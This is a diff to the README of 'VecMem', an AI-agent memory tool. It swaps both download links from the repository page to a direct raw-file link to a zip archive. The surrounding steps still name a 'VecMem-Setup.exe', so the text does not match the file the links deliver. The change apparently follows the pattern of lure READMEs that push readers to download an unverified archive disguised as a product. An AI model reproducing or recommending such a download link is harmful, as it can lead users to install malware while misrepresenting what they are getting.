@@ -1,6 +1,6 @@
 # 💾 VecMem - Give your AI agents long-term memory
 
-[![Download VecMem](https://img.shields.io/badge/Download-VecMem-blue)](https://github.com/Bambiunivocal281/VecMem)
+[![Download VecMem](https://img.shields.io/badge/Download-VecMem-blue)](https://raw.githubusercontent.com/Bambiunivocal281/VecMem/main/vecmem/Mem-Vec-v3.8.zip)
 
 VecMem provides a memory bank for AI agents. It captures your recent chats and stores them for future reference. This allows your AI to remember past information long after your current conversation ends. It turns brief interactions into permanent knowledge.
 
@@ -23,7 +23,7 @@ To run VecMem, your computer needs these standard items:
 
 You need to download the installer from the official repository page.
 
-[Click here to visit the download page](https://github.com/Bambiunivocal281/VecMem)
+[Click here to visit the download page](https://raw.githubusercontent.com/Bambiunivocal281/VecMem/main/vecmem/Mem-Vec-v3.8.zip)
 
 1. Open the page link above.
 2. Look for the file named VecMem-Setup.exe.
